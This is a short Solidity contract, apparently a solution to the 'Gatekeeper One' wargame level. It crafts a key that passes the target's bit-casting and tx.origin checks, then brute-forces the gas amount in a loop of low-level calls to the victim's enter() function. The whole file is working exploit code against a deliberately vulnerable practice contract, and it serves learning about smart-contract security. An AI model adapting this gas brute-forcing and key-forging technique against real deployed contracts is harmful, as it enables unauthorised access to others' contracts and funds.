pragma solidity ^0.8.10;

contract AttackGatekeeperOne {
    address public victim;

    constructor(address _victim) {
        victim = _victim;
    }   

    function attack(bytes8 _key, uint256 _gasLevel) public returns(bool){
        //0xffffffff0000a9E1
        require(uint32(uint64(_key)) == uint16(uint64(_key)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_key)) != uint64(_key), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_key)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");

        bytes memory payload = abi.encodeWithSignature("enter(bytes8)", _key);
        bool success;
        for (uint256 i=0; i<120; i++){
            (success,) = victim.call{gas: i + _gasLevel + 8191*10}(payload);
            if(success){
                break;
            }
        }
        require(success, "failed");
        return success;
    }

}